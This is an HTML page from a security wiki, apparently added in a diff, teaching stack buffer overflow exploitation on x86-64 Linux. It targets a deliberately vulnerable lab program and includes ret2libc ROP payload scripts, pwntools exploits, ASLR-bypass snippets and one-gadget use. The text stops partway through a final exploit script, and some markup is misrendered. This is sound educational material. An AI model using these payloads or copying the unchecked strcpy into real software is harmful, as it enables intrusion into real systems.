@@ -1,0 +1,1218 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Stack Overflows | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="Stack Overflows">
+		<meta name="keywords" content="buffer-overflow, exploitation, gdb, pwntools, ret2libc, rop, stack-overflow, techniques">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="Stack Overflows">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Stack overflow exploitation methodology - crash analysis, offset determination, ret2libc, and a complete end-to-end walkthrough on x86-64 Linux.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/fundamentals/stack-overflows.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="Stack Overflows">
+		<meta name="twitter:description" itemprop="description" content="Stack overflow exploitation methodology - crash analysis, offset determination, ret2libc, and a complete end-to-end walkthrough on x86-64 Linux.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#a-complete-methodology">A Complete Methodology</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#step-1-trigger-the-crash">Step 1 - Trigger the Crash</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#step-2-determine-the-offset">Step 2 - Determine the Offset</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#step-3-verify-control">Step 3 - Verify Control</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#step-4-find-useful-addresses">Step 4 - Find Useful Addresses</a></b>
+					<ul>
+						<li><a href="#finding-system">Finding 'system()'</a></li>
+						<li><a href="#finding-binsh">Finding '/bin/sh'</a></li>
+						<li><a href="#finding-pop-rdi-ret">Finding 'pop rdi; ret'</a></li>
+						<li><a href="#finding-ret-for-stack-alignment">Finding 'ret' (for stack alignment)</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#step-5-build-the-exploit">Step 5 - Build the Exploit</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#anatomy-of-the-rop-chain">Anatomy of the ROP Chain</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#step-6-debug-and-iterate">Step 6 - Debug and Iterate</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#bypassing-aslr">Bypassing ASLR</a></b>
+					<ul>
+						<li><a href="#leak-a-return-address-from-the-stack">1. Leak a return address from the stack</a></li>
+						<li><a href="#got-dereference">2. GOT dereference</a></li>
+						<li><a href="#ret2plt">Ret2plt</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#ret2dlresolve">Ret2dlresolve</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-x86-64-vs-x86-difference">The x86-64 vs x86 Difference</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#endianness-considerations">Endianness Considerations</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#avoiding-bad-characters">Avoiding Bad Characters</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#nop-sleds">NOP Sleds</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#one-gadgets">One Gadgets</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#a-production-exploit-script">A Production Exploit Script</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#gdb-debugging-commands">GDB Debugging Commands</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#defeating-protections">Defeating Protections</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-full-crash-to-shell-checklist">The Full Crash-to-Shell Checklist</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/fundamentals/index.html">Fundamentals</a></li>
+						<li aria-current="page"><a href="/wiki/articles/fundamentals/stack-overflows.html">Stack Overflows</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="stack-overflows">Stack Overflows</h2>
+					<p>
+						Stack overflow exploitation methodology - crash analysis, offset determination, ret2libc, and
+						a complete end-to-end walkthrough on x86-64 Linux.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							A stack overflow happens when a program writes past a fixed-size buffer on the stack and overwrites
+							the saved return address. Because the return address decides where execution resumes, an attacker
+							who controls it can redirect the program. This article walks a repeatable methodology: crash
+							the target, find the offset, verify control of the instruction pointer, locate
+							<code>system</code>
+							and
+							<code>/bin/sh</code>
+							, and build a ret2libc chain. By the end you can take a vulnerable x86-64 Linux binary
+							from crash to shell.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/buffer-overflows.html">Buffer Overflows</a> - buffer overflow fundamentals, unsafe functions, return address overwrite, canaries, NX</li>
+							<li><a href="/wiki/articles/fundamentals/stack.html">Stack</a> - stack frame layout, prologue/epilogue, RBP/RSP, the call/ret mechanism</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="a-complete-methodology">A Complete Methodology</h3>
+						<p>
+							Stack overflow exploitation follows a repeatable methodology. Starting from a crash, progressing
+							through offset determination, control verification, and ultimately code execution. The methodology
+							has steps, and each step either works or it doesn't - no guesswork.
+						</p>
+						<p>The steps:</p>
+						<pre class="plaintext">
+1. Trigger the crash - confirm the vulnerability
+2. Determine the offset - where does RIP get overwritten?
+3. Verify control - prove you can set RIP to arbitrary values
+4. Find useful addresses - system(), &#34;/bin/sh&#34;, gadgets
+5. Build the exploit - construct the payload
+6. Debug and iterate - fix alignment, bad bytes, offsets
+						</pre>
+					</section>
+					<section>
+						<h3 id="step-1-trigger-the-crash">Step 1 - Trigger the Crash</h3>
+						<p>Start with a vulnerable program:</p>
+						<pre class="c">
+// vuln.c - Deliberately vulnerable server-like program
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+void handle_input(char *buffer) {
+    char local[128];
+    strcpy(local, buffer);  // VULNERABLE - no bounds check
+    printf(&#34;Received: %s\n&#34;, local);
+}
+
+int main(int argc, char **argv) {
+    if (argc &lt; 2) {
+        char input[1024];
+        ssize_t n = read(STDIN_FILENO, input, sizeof(input));
+        if (n &gt; 0) {
+            input[n] = &#39;\0&#39;;
+            handle_input(input);
+        }
+    } else {
+        handle_input(argv[1]);
+    }
+    return 0;
+}
+						</pre>
+						<p>Compile without protections for the walkthrough:</p>
+						<pre class="bash">
+$ gcc -fno-stack-protector -z execstack -no-pie -o vuln vuln.c
+						</pre>
+						<p>Trigger the crash:</p>
+						<pre class="bash">
+$ python3 -c &#34;print(&#39;A&#39; * 300)&#34; | ./vuln
+Received: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...AAA
+Segmentation fault (core dumped)
+						</pre>
+					</section>
+					<section>
+						<h3 id="step-2-determine-the-offset">Step 2 - Determine the Offset</h3>
+						<p>
+							Generate a cyclic pattern (De Bruijn sequence) to find exactly which bytes land in
+							<code>RIP</code>
+							:
+						</p>
+						<pre class="bash">
+$ python3 -c &#34;from pwn import *; print(cyclic(300, n=8).decode())&#34;
+						</pre>
+						<p>Run under GDB:</p>
+						<pre class="bash">
+$ python3 -c &#34;from pwn import *; print(cyclic(300, n=8).decode())&#34; &gt; pattern.txt
+$ gdb ./vuln
+(gdb) run &lt; pattern.txt
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000004011b6 in handle_input ()
+(gdb) x/gx $rsp
+0x7fffffffe010: 0x636161716361616f
+						</pre>
+						<p>
+							Read the 8 bytes at RSP (where
+							<code>ret</code>
+							pops into
+							<code>RIP</code>
+							):
+						</p>
+						<pre class="bash">
+$ python3 -c &#34;from pwn import *; print(cyclic_find(0x636161716361616f, n=8))&#34;
+136
+						</pre>
+						<p>
+							The offset to
+							<code>RIP</code>
+							is 136 bytes: buffer (128) + saved RBP (8) = 136. This matches.
+						</p>
+						<p>Verify:</p>
+						<pre class="bash">
+$ python3 -c &#34;print(&#39;A&#39;*136 + &#39;B&#39;*8)&#34; &gt; verify.txt
+$ gdb ./vuln
+(gdb) run &lt; verify.txt
+Program received signal SIGSEGV, Segmentation fault.
+(gdb) x/gx $rsp
+0x7fffffffe010: 0x4242424242424242   # &#34;BBBBBBBB&#34;
+(gdb) info registers rip
+rip            0x4242424242424242
+						</pre>
+						<p>
+							<code>RIP</code>
+							= 0x4242424242424242. We have complete control of the return address at offset 136.
+						</p>
+					</section>
+					<section>
+						<h3 id="step-3-verify-control">Step 3 - Verify Control</h3>
+						<p>Write a quick script to test arbitrary addresses:</p>
+						<pre class="python">
+# control_test.py
+import struct
+import sys
+
+offset = 136
+target = 0x4142434445464748  # &#34;ABCDEFGH&#34;
+
+payload = b&#34;A&#34; * offset + struct.pack(&#34;&lt;Q&#34;, target)
+sys.stdout.buffer.write(payload)
+						</pre>
+						<pre class="bash">
+$ python3 control_test.py &gt; control.bin
+$ gdb -ex &#34;run &lt; control.bin&#34; ./vuln
+Program received signal SIGSEGV.
+(gdb) info registers rip
+rip            0x4142434445464748
+						</pre>
+						<p>
+							<code>RIP</code>
+							is exactly the target value. Control is confirmed.
+						</p>
+					</section>
+					<section>
+						<h3 id="step-4-find-useful-addresses">Step 4 - Find Useful Addresses</h3>
+						<h4 id="finding-system">Finding 'system()'</h4>
+						<pre class="bash">
+$ gdb ./vuln
+(gdb) break main
+(gdb) run
+(gdb) print system
+$1 = {int (const char *)} 0x7ffff7c591a0 &lt;__libc_system&gt;
+						</pre>
+						<h4 id="finding-binsh">Finding '/bin/sh'</h4>
+						<pre class="bash">
+(gdb) find &amp;system,+9999999,&#34;/bin/sh&#34;
+0x7ffff7db8d88
+1 pattern found.
+						</pre>
+						<p>Or with pwntools:</p>
+						<pre class="bash">
+$ python3 -c &#34;
+from pwn import *
+libc = ELF(&#39;/usr/lib/libc.so.6&#39;)
+print(f&#39;system:    {hex(libc.symbols[\&#34;system\&#34;])}&#39;)
+print(f&#39;/bin/sh:   {hex(next(libc.search(b\&#34;/bin/sh\&#34;)))}&#39;)
+&#34;
+system:    0x50d70
+/bin/sh:   0x1d8678
+						</pre>
+						<p>These are offsets within libc. Add libc's base address at runtime to get absolute addresses.</p>
+						<h4 id="finding-pop-rdi-ret">Finding 'pop rdi; ret'</h4>
+						<pre class="bash">
+$ ROPgadget --binary ./vuln | grep &#34;pop rdi&#34;
+0x000000000040120b : pop rdi ; ret
+						</pre>
+						<h4 id="finding-ret-for-stack-alignment">Finding 'ret' (for stack alignment)</h4>
+						<pre class="bash">
+$ ROPgadget --binary ./vuln | grep &#34;: ret$&#34;
+0x000000000040101a : ret
+						</pre>
+						<p>
+							A lone
+							<code>ret</code>
+							gadget is useful for 16-byte stack alignment. Sometimes
+							<code>system()</code>
+							crashes because
+							RSP is not 16-byte aligned when
+							<code>system()</code>
+							executes. Adding a
+							<code>ret</code>
+							gadget before
+							<code>system()</code>
+							shifts RSP by 8, fixing the alignment.
+						</p>
+					</section>
+					<section>
+						<h3 id="step-5-build-the-exploit">Step 5 - Build the Exploit</h3>
+						<p>
+							The ret2libc strategy: overwrite return address ->
+							<code>pop rdi; ret</code>
+							->
+							<code>&#34;/bin/sh&#34;</code>
+							address ->
+							<code>system()</code>
+							address. On x86-64, the first argument goes in RDI. The
+							<code>pop rdi</code>
+							gadget pops the
+							next value on the stack into RDI, then returns to the next address.
+						</p>
+						<pre class="python">
+# exploit_ret2libc.py
+import struct
+import sys
+
+offset = 136
+
+# Offsets from libc base
+libc_system  = 0x50d70
+libc_bin_sh  = 0x1d8678
+
+# Known libc base (ASLR disabled for learning)
+libc_base = 0x7ffff7dc1000
+
+# Compute absolute addresses
+system_addr = libc_base + libc_system
+bin_sh_addr = libc_base + libc_bin_sh
+
+# Gadget (from our binary)
+pop_rdi_ret = 0x40120b
+ret_gadget  = 0x40101a  # For stack alignment
+
+payload  = b&#34;A&#34; * offset
+payload += struct.pack(&#34;&lt;Q&#34;, ret_gadget)   # Align stack (optional, if needed)
+payload += struct.pack(&#34;&lt;Q&#34;, pop_rdi_ret)  # pop rdi; ret
+payload += struct.pack(&#34;&lt;Q&#34;, bin_sh_addr)  # value -&gt; RDI
+payload += struct.pack(&#34;&lt;Q&#34;, system_addr)  # call system(&#34;/bin/sh&#34;)
+
+sys.stdout.buffer.write(payload)
+						</pre>
+					</section>
+					<section>
+						<h3 id="anatomy-of-the-rop-chain">Anatomy of the ROP Chain</h3>
+						<p>
+							What happens when the vulnerable function executes
+							<code>ret</code>
+							:
+						</p>
+						<pre class="plaintext">
+RSP before ret points to ret_gadget:
+
+Stack layout (RSP moving upward):
++-----------------+  &lt;- RSP after leave (rbp restored, pointing here)
+| ret_gadget      |  &lt;- first ret pops this -&gt; RIP
++-----------------+  RSP += 8
+| pop_rdi_ret     |  &lt;- ret_gadget&#39;s ret pops this -&gt; RIP
++-----------------+  RSP += 8
+| bin_sh_addr     |  &lt;- pop_rdi_ret&#39;s pop reads this -&gt; RDI
++-----------------+  RSP += 8 (pop increments RSP)
+| system_addr     |  &lt;- pop_rdi_ret&#39;s ret pops this -&gt; RIP
++-----------------+
+| (system&#39;s frame)|  &lt;- system() starts executing here
+						</pre>
+						<p>
+							<abbr title="Central Processing Unit">CPU</abbr>
+							instruction trace:
+						</p>
+						<pre class="plaintext">
+1. ret          -&gt; RIP = ret_gadget
+2. ret          -&gt; RIP = pop_rdi_ret   (pops next word, does nothing else)
+3. pop rdi      -&gt; RDI = bin_sh_addr
+4. ret          -&gt; RIP = system_addr   (calls system with RDI = &#34;/bin/sh&#34;)
+						</pre>
+					</section>
+					<section>
+						<h3 id="step-6-debug-and-iterate">Step 6 - Debug and Iterate</h3>
+						<p>Test the exploit:</p>
+						<pre class="bash">
+$ python3 exploit_ret2libc.py &gt; payload.bin
+$ gdb ./vuln
+(gdb) run &lt; payload.bin
+						</pre>
+						<p>
+							If the exploit fails at
+							<code>system()</code>
+							, common causes:
+						</p>
+						<p>
+							<b>1. Stack misalignment.</b>
+							Check RSP when
+							<code>system</code>
+							is called:
+						</p>
+						<pre class="bash">
+(gdb) break *system
+(gdb) run &lt; payload.bin
+(gdb) print $rsp
+$1 = 0x7fffffffe038
+(gdb) print $rsp &amp; 0xf
+$2 = 0x8   # 8 means misaligned - should be 0x0
+						</pre>
+						<p>
+							Fix: add a
+							<code>ret</code>
+							gadget before
+							<code>system()</code>
+							to shift RSP by 8.
+						</p>
+						<p>
+							<b>2. libc base wrong.</b>
+							Dump
+							<code>/proc/&lt;pid&gt;/maps</code>
+							to verify:
+						</p>
+						<pre class="bash">
+(gdb) info proc mappings
+          Start Addr           End Addr       Size     Offset  Perms  objfile
+      0x555555554000     0x555555555000     0x1000        0x0  r--p   /home/user/vuln
+      0x7ffff7dc1000     0x7ffff7de8000    0x27000        0x0  r--p   /usr/lib/libc.so.6
+      0x7ffff7de8000     0x7ffff7f72000   0x18a000    0x27000  r-xp   /usr/lib/libc.so.6
+						</pre>
+						<p>The base is the first address of the first mapping (or the one with offset 0).</p>
+						<p>
+							<b>3. MOVAPS issue.</b>
+							Some versions of glibc use
+							<code>movaps</code>
+							which requires 16-byte-aligned RSP.
+							Fix with a
+							<code>ret</code>
+							gadget or by entering
+							<code>system()</code>
+							with RSP % 16 == 0.
+						</p>
+						<p>Resolving addresses dynamically with pwntools (no ASLR disabling needed for a local process):</p>
+						<pre class="python">
+# exploit_pwnlib.py - Uses pwntools for automatic address resolution
+from pwn import *
+
+context.arch = &#39;amd64&#39;
+context.os = &#39;linux&#39;
+
+# Start the process locally
+p = process(&#39;./vuln&#39;)
+
+# Or connect to a remote service:
+# p = remote(&#39;target.example.com&#39;, 1337)
+
+elf = ELF(&#39;./vuln&#39;)
+libc = ELF(&#39;/usr/lib/libc.so.6&#39;)
+
+# Find pop rdi; ret in our binary
+rop = ROP(elf)
+pop_rdi = rop.find_gadget([&#39;pop rdi&#39;, &#39;ret&#39;])[0]
+ret = rop.find_gadget([&#39;ret&#39;])[0]
+
+# libc functions (offsets - need leak or known base for absolute addresses)
+# For a local process with no ASLR:
+offset = 136
+
+payload = flat(
+    b&#39;A&#39; * offset,
+    ret,            # Stack alignment
+    pop_rdi,        # pop rdi; ret
+    0xdeadbeef,     # Placeholder for &#34;/bin/sh&#34; address
+    0xcafebabe,     # Placeholder for system address
+)
+
+p.sendline(payload)
+p.interactive()
+						</pre>
+					</section>
+					<section>
+						<h3 id="bypassing-aslr">Bypassing ASLR</h3>
+						<p>
+							ASLR randomizes libc's base address. On every run, libc loads at a different address. The exploit
+							must discover the base address at runtime through one of these techniques:
+						</p>
+						<h4 id="leak-a-return-address-from-the-stack">1. Leak a return address from the stack</h4>
+						<p>
+							If the program's output includes any stack data (e.g.,
+							<code>%s</code>
+							format string, error messages that
+							print buffer contents), you can leak a return address that points into
+							<code>__libc_start_main</code>
+							.
+							Subtract the known offset to get libc's base:
+						</p>
+						<pre class="python">
+# If you can leak a __libc_start_main return address:
+leaked_libc_start_main = unpack(leaked_bytes, &#39;all&#39;)
+libc_base = leaked_libc_start_main - 0x29d90  # offset may vary by glibc version
+system_addr = libc_base + libc.symbols[&#39;system&#39;]
+bin_sh_addr = libc_base + next(libc.search(b&#39;/bin/sh&#39;))
+						</pre>
+						<h4 id="got-dereference">2. GOT dereference</h4>
+						<p>
+							If you can read from an arbitrary address (format string bug, arbitrary read), read a resolved
+							GOT entry:
+						</p>
+						<pre class="python">
+# leak puts@GOT
+# puts@GOT contains the resolved address of puts in libc
+puts_got_addr = elf.got[&#39;puts&#39;]
+# Read 8 bytes from puts_got_addr -&gt; resolved_puts_addr
+libc_base = resolved_puts_addr - libc.symbols[&#39;puts&#39;]
+						</pre>
+						<h4 id="ret2plt">Ret2plt</h4>
+						<p>
+							Instead of jumping to libc directly, jump to the PLT entry for
+							<code>system</code>
+							. The PLT is part of
+							your executable, so its address is static (if PIE is disabled):
+						</p>
+						<pre class="bash">
+$ objdump -d ./vuln | grep &#34;@plt&gt;:&#34; | head
+0000000000401030 &lt;puts@plt&gt;:
+0000000000401040 &lt;printf@plt&gt;:
+						</pre>
+						<p>
+							But beware:
+							<code>system</code>
+							may not be imported by the program. If it's not in the PLT, this approach
+							doesn't work. You'd need to resolve the libc address (as above) or use ret2dlresolve (a more
+							advanced technique that tricks the dynamic linker into resolving any function you want).
+						</p>
+					</section>
+					<section>
+						<h3 id="ret2dlresolve">Ret2dlresolve</h3>
+						<p>
+							When the PLT doesn't contain the function you need, ret2dlresolve forges the structures the
+							dynamic linker uses to resolve symbols, tricking it into resolving
+							<code>system</code>
+							even though the
+							binary never originally imported it.
+						</p>
+						<p>
+							The idea: the dynamic linker resolves PLT entries by reading
+							<code>Elf64_Rela</code>
+							,
+							<code>Elf64_Sym</code>
+							, and
+							string table entries. If you can write these structs into known memory locations and redirect
+							the resolver to your forged entries,
+							<code>ld.so</code>
+							will resolve any symbol you want:
+						</p>
+						<pre class="python">
+# Conceptual ret2dlresolve (simplified)
+# Write fake Elf64_Rela, Elf64_Sym, and &#34;system\0&#34; string into BSS
+# Set up the stack so that PLT[0] -&gt; _dl_runtime_resolve uses your fake structures
+fake_rela = p64(fake_got_addr) + p64(R_X86_64_JUMP_SLOT | (sym_index &lt;&lt; 32)) + p64(0)
+fake_sym = p64(st_name_offset) + p32(0) + ...  # Point to &#34;system\0&#34;
+
+# On the stack:
+payload  = b&#39;A&#39; * offset
+payload += p64(plt0)       # Jump to PLT[0] (the resolver entry)
+payload += p64(reloc_index) # Fake JMPREL index pointing to your fake_rela
+payload += p64(ret_addr)    # Where to return after system() finishes
+payload += p64(bin_sh_addr) # Argument for system
+						</pre>
+						<p>
+							This is an advanced technique covered in the
+							<a href="/wiki/articles/fundamentals/rop.html">ROP]{Return-Oriented Programming} article ( [/wiki/articles/fundamentals/rop.html</a>
+							.
+						</p>
+					</section>
+					<section>
+						<h3 id="the-x86-64-vs-x86-difference">The x86-64 vs x86 Difference</h3>
+						<p>
+							32-bit x86 uses a completely different calling convention. Arguments are passed on the stack,
+							not in registers:
+						</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Property</th>
+									<th align="center">x86-64 (System V)</th>
+									<th align="center">x86 (cdecl)</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">Arg 1</td>
+									<td align="center">RDI</td>
+									<td align="center"></td>
+								</tr>
+								<tr>
+									<td align="center">Arg 2</td>
+									<td align="center">RSI</td>
+									<td align="center"></td>
+								</tr>
+								<tr>
+									<td align="center">Arg 3</td>
+									<td align="center">RDX</td>
+									<td align="center"></td>
+								</tr>
+								<tr>
+									<td align="center">Return value</td>
+									<td align="center">RAX</td>
+									<td align="center">EAX</td>
+								</tr>
+								<tr>
+									<td align="center">Stack alignment</td>
+									<td align="center">16 bytes before call</td>
+									<td align="center">4 bytes</td>
+								</tr>
+								<tr>
+									<td align="center">Return address size</td>
+									<td align="center">8 bytes</td>
+									<td align="center">4 bytes</td>
+								</tr>
+							</tbody>
+						</table>
+						<p>
+							In x86 ret2libc, you don't need a
+							<code>pop rdi</code>
+							gadget - you just place the argument on the stack:
+						</p>
+						<pre class="plaintext">
+32-bit ret2libc payload:
+[AAAA] * offset
+[system_addr]     &lt;- return address
+[exit_addr]       &lt;- system()&#39;s return address (or &#34;AAAA&#34;)
+[bin_sh_addr]     &lt;- first argument to system
+						</pre>
+						<p>
+							The stack IS the argument passing mechanism. This makes 32-bit exploitation simpler but also
+							makes the calling convention itself a larger attack surface (every argument is on the stack,
+							adjacent to the buffer).
+						</p>
+					</section>
+					<section>
+						<h3 id="endianness-considerations">Endianness Considerations</h3>
+						<p>
+							x86 and x86-64 are little-endian. Multi-byte values are stored with the least significant byte
+							at the lowest address:
+						</p>
+						<pre class="plaintext">
+uint64_t value = 0x00007FFFF7C591A0;
+
+Memory representation (low to high address):
+A0 91 C5 F7 FF 7F 00 00
+						</pre>
+						<p>In Python:</p>
+						<pre class="python">
+import struct
+addr = 0x00007FFFF7C591A0
+packed = struct.pack(&#34;&lt;Q&#34;, addr)  # Little-endian
+print(packed.hex())                # a091c5f7ff7f0000
+						</pre>
+						<p>When writing addresses into a payload, always pack them as little-endian on x86/x86-64.</p>
+					</section>
+					<section>
+						<h3 id="avoiding-bad-characters">Avoiding Bad Characters</h3>
+						<p>Some programs process input through functions that interpret certain bytes specially:</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Character</th>
+									<th align="center">Context</th>
+									<th align="center">Problem</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">0x00 (null)</td>
+									<td align="center">strcpy, gets, scanf</td>
+									<td align="center">Terminates string copy</td>
+								</tr>
+								<tr>
+									<td align="center">0x0A (newline)</td>
+									<td align="center">gets, fgets, readline</td>
+									<td align="center">Terminates input</td>
+								</tr>
+								<tr>
+									<td align="center">0x0D (carriage return)</td>
+									<td align="center">gets</td>
+									<td align="center">Terminates input</td>
+								</tr>
+								<tr>
+									<td align="center">0x20 (space)</td>
+									<td align="center">scanf("%s")</td>
+									<td align="center">Terminates input</td>
+								</tr>
+								<tr>
+									<td align="center">0xFF</td>
+									<td align="center">Various</td>
+									<td align="center">May trigger EOF or special handling</td>
+								</tr>
+							</tbody>
+						</table>
+						<p>
+							If the address you need to write (e.g.,
+							<code>0x00007FFFF7C591A0</code>
+							) contains a null byte, you need
+							to adjust. Options:
+						</p>
+						<ol>
+							<li><b>Partial overwrite</b> : Only overwrite the lower bytes (the null bytes in the address are the upper bytes, which might already be correct if RBP is already mostly the right value)</li>
+							<li><b>Find alternative gadgets</b> whose addresses don't contain bad chars</li>
+							<li><b>Use 'read()' or 'recv()' syscalls</b> that don't stop at null bytes</li>
+						</ol>
+						<pre class="python">
+def has_bad_chars(data, bad_chars=b&#39;\x00\x0a&#39;):
+    return any(c in data for c in bad_chars)
+
+addr = 0x7ffff7c591a0
+packed = struct.pack(&#34;&lt;Q&#34;, addr)
+if has_bad_chars(packed):
+    print(f&#34;WARNING: Address {hex(addr)} contains bad chars&#34;)
+    # Try a different gadget or technique
+						</pre>
+					</section>
+					<section>
+						<h3 id="nop-sleds">NOP Sleds</h3>
+						<p>
+							When you know roughly where your shellcode is (within a few hundred bytes) but not precisely,
+							use a NOP sled. The
+							<code>nop</code>
+							instruction (
+							<code>\x90</code>
+							on x86/x86-64) does nothing and advances to the
+							next instruction. A long sequence of NOPs followed by the shellcode means any jump into the
+							NOP region will slide to the shellcode:
+						</p>
+						<pre class="plaintext">
++--------------------+
+| Garbage            |
++--------------------+
+| \x90\x90\x90...    |  &lt;- Return here (approximate)
+| \x90\x90\x90...    |  &lt;- Slide down
+| \x90\x90\x90...    |
++--------------------+
+| Shellcode          |  &lt;- Eventually reaches here
++--------------------+
+						</pre>
+						<pre class="python">
+nop_sled = b&#34;\x90&#34; * 100
+shellcode = b&#34;...&#34;  # your shellcode
+padding   = b&#34;A&#34; * (offset - len(nop_sled) - len(shellcode))
+ret_addr  = struct.pack(&#34;&lt;Q&#34;, approx_buffer_addr + 30)  # aim for middle of sled
+
+payload = nop_sled + shellcode + padding + ret_addr
+						</pre>
+						<p>
+							NOP sleds are less relevant now because of NX - you can't execute shellcode on the stack anyway.
+							For ret2libc and
+							<abbr title="Return-Oriented Programming">ROP</abbr>
+							chains, precision is required.
+						</p>
+					</section>
+					<section>
+						<h3 id="one-gadgets">One Gadgets</h3>
+						<p>
+							<code>system()</code>
+							is convenient but not always available. Glibc contains "one-gadget" magic addresses
+							<ul>
+								<li>short instruction sequences that directly call <code>execve(&#34;/bin/sh&#34;, NULL, NULL)</code> without needing</li>
+							</ul>
+						</p>
+						<p>to set RDI manually:</p>
+						<pre class="bash">
+$ sudo pacman -S one_gadget  # or: gem install one_gadget
+$ one_gadget /usr/lib/libc.so.6
+0x5225e posix_spawn(rsp+0x1c, &#34;/bin/sh&#34;, 0, rbp, rsp+0x60, environ)
+constraints:
+  rsp &amp; 0xf == 0
+  rcx == NULL
+  rbp == NULL || (u16)[rbp] == NULL
+
+0x52261 posix_spawn(rsp+0x1c, &#34;/bin/sh&#34;, 0, rbp, rsp+0x60, environ)
+constraints:
+  [rsp+0x1c] == NULL
+  rbp == NULL || (u16)[rbp] == NULL
+
+0xdd867 execve(&#34;/bin/sh&#34;, rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+						</pre>
+						<p>
+							A one-gadget is just an address in libc that, if you jump to it while satisfying the listed
+							constraints, gives you a shell. The constraints describe the register/memory conditions that
+							must hold:
+						</p>
+						<pre class="python">
+# Using one-gadget
+libc_base = leaked_addr - offset_in_libc
+one_gadget = libc_base + 0xdd867
+
+payload = b&#34;A&#34; * offset + struct.pack(&#34;&lt;Q&#34;, one_gadget)
+						</pre>
+						<p>
+							The appeal of one-gadgets is simplicity - no need to find
+							<code>pop rdi</code>
+							gadgets or a
+							<code>/bin/sh</code>
+							string.
+							The constraints must be checked in GDB at the point of exploitation.
+						</p>
+					</section>
+					<section>
+						<h3 id="a-production-exploit-script">A Production Exploit Script</h3>
+						<p>A final exploit that handles the full methodology:</p>
+						<pre class="python">
+#!/usr/bin/env python3
+# exploit_final.py - Production-quality stack overflow exploit
+from pwn import *
+
+context.arch = &#39;amd64&#39;
+context.os = &#39;linux&#39;
+context.log_level = &#39;debug&#39;
+
+TARGET = &#39;./vuln&#39;
+
+def find_offset():
+    &#34;&#34;&#34;Step 2: Determine offset to RIP.&#34;&#34;&#34;
+    p = process(TARGET)
+    p.sendline(cyclic(300, n=8))
